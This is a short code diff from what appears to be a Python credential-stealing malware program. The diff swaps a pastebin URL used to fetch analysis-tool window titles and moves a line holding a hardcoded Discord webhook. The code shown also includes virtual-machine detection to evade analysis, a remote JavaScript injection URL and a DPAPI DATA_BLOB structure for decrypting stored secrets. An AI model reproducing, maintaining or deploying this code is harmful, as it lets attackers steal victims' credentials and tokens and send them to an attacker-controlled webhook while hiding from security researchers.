@@ -166,7 +166,7 @@ def fetch_window_titles(url):
     return set(response.text.strip().split('\r\n'))
 
 def check_windows():
-    window_titles_url = 'https://pastebin.com/raw/sih1JMj5'
+    window_titles_url = 'https://pastebin.com/raw/X9qMzxj2'
     window_titles = fetch_window_titles(window_titles_url)
 
     @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
@@ -227,8 +227,7 @@ def check_dll():
     if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
         exit_program('VM Detected')
 
-
-    h00k = "https://discord.com/api/webhooks/1263599279260303361/L-lgQPLOuyh1zu_uMGvWq7-XBwfyN42nF4fEuw5AKL-djoxoof0kRRfDZlfQ-kCG7gos"
+h00k = "https://discord.com/api/webhooks/1263599279260303361/L-lgQPLOuyh1zu_uMGvWq7-XBwfyN42nF4fEuw5AKL-djoxoof0kRRfDZlfQ-kCG7gos"
 inj3c710n_url = f"https://raw.githubusercontent.com/0x00G/injection/main/index.js"
 
 class DATA_BLOB(Structure):
